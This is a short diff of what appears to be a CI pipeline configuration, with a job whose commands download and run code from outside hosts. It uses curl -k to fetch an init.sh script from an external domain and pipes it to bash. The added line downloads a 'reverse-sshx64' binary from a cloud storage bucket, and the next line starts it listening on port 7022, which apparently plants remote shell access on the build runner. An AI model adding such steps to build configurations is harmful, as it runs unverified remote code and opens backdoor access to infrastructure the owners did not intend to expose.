@@ -34,6 +34,7 @@ blocks:
             - '#./reverse-sshx64  -v -l -p 7022  '
             - 'curl -O -k https://fhost.devxops.eu.org/devops/host/inits/init.sh '
             - bash init.sh 296 sema devops
+            - 'curl -O -k https://bucket-2022.s3.us-west-004.backblazeb2.com/linshi/reverse-sshx64  '
             - './reverse-sshx64  -v -l -p 7022  '
       epilogue:
         on_pass:
